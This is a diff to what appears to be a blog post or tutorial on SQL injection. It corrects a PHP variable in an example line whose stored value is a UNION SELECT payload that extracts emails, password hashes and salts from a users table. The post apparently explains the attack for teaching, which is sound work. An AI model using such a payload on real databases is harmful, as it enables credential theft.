@@ -97,7 +97,7 @@ What happens on the server side:
 
 {% highlight php %}
 <?php
-	$_SERVER['email'] = "' UNION SELECT GROUP_CONCAT(email),GROUP_CONCAT(password),GROUP_CONCAT(salt) FROM (SELECT email,password,salt FROM users LIMIT 50 OFFSET 0) #"
+	$_SESSION['email'] = "' UNION SELECT GROUP_CONCAT(email),GROUP_CONCAT(password),GROUP_CONCAT(salt) FROM (SELECT email,password,salt FROM users LIMIT 50 OFFSET 0) #"
 {% endhighlight php %}	
 
 and the second query becomes:
